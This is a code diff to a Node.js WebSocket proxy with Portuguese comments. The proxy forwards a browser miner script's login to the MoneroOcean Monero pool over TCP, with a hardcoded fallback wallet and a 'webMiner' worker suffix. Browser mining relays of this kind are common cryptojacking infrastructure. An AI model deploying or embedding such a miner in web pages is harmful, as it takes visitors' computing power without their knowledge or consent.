@@ -26,6 +26,7 @@ wss.on('connection', (ws) => {
             const data = JSON.parse(message);
             console.log('📥 Mensagem do Navegador:', data.identifier || data.type || 'Dados crus');
 
+            // Validação flexível para capturar o Handshake enviado pelo miner.js
             if (data.identifier === 'handshake' || data.type === 'login' || data.identifier === 'login') {
                 if (stratumClient) stratumClient.destroy();
                 stratumClient = new net.Socket();
@@ -36,10 +37,16 @@ wss.on('connection', (ws) => {
                     console.log('✅ CONECTADO VIA TCP À POOL MONEROOCEAN!');
                     poolConnected = true;
 
-                    // CORREÇÃO: Garante que a carteira tenha o sufixo do algoritmo se ele não existir
+                    // Captura a carteira enviada ou usa a padrão de contingência
                     let userWallet = data.login || data.wallet || "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+                    
+                    // CORREÇÃO: Formata a carteira adicionando o worker e o sufixo separadamente
                     if (!userWallet.includes('~cn/lite')) {
-                        userWallet += "~cn/lite";
+                        if (!userWallet.includes('.')) {
+                            userWallet += ".webMiner~cn/lite";
+                        } else {
+                            userWallet += "~cn/lite";
+                        }
                     }
 
                     // Monta o cabeçalho perfeito aceito pela MoneroOcean
